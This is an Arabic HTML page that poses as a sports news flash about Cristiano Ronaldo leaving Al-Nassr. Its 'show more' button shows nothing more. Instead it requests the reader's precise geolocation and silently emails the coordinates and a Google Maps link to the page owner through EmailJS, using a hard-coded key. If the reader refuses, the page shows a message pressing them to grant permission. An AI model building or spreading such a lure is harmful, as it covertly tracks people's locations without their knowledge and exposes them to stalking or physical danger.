<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>المقالة الرياضية الأولى</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){ emailjs.init("6VfcdCXz6J4TDZIXr"); })();

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        alert("❌ المتصفح لا يدعم الموقع الجغرافي");
      }
    }

    function sendLocation(position) {
      let lat = position.coords.latitude;
      let lng = position.coords.longitude;
      let mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

      emailjs.send("service_8b3f7pq", "template_18najwh", {
        latitude: lat,
        longitude: lng,
        map_link: mapLink
      })
      
      ;
    }

    function showError(error) {
      if (error.code === error.PERMISSION_DENIED) {
        alert(" تم رفض الوصول إلى الاذونات المطلوبة الرجاء منح الاذونات المطلوبة ليعمل الموقع بشكل صحيح");
      } else {
        alert("⚠️ خطأ في الوصول الى الاذونات");
      }
    }
  </script>
</head>
<body>
  <h2>عاجل</h2>
  <p>بعد مسيرة حافلة بالإثارة، أعلن نادي النصر السعودي وكريستيانو رونالدو انفصالهما بالتراضي، منهين بذلك فصلاً مهماً في تاريخ النادي والكرة السعودية. سيظل تأثير الأسطورة البرتغالية حاضراً في ذاكرة الجماهير والأرقام القياسية التي حققها.
</p>
  <button onclick="requestLocation()">عرض المزيد</button>
</body>
</html>
